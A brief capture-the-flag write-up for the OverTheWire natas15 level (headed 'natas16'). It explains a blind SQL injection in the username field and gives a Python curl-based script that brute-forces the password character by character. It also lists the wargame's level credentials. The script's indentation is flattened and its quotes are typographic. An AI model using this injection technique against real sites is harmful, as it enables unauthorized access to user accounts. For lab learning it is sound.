# natas16

SQL injection.

View source page and find that the username is a SQL injection point. Noticed that the database only consists of username and password, we can brute force any password existing in the database one character at a time.

The following automated program is a DFS example that works for this challenge:

```python
import commands


def search(password):
if len(password) <= 32:
words = “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234568790”
for c in words:
newpassword = password + c
sql = ‘curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/index.php\?debug\=aa\&username\=\\\”%20or%20binary%20password%20like%20\\\”‘ + newpassword + ‘%’
return_code, output = commands.getstatusoutput(sql)
if output.find(‘exists’) > 0:
print(newpassword)
search(newpassword)


search(”)
```

Side note: The username of this password is natas16

Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
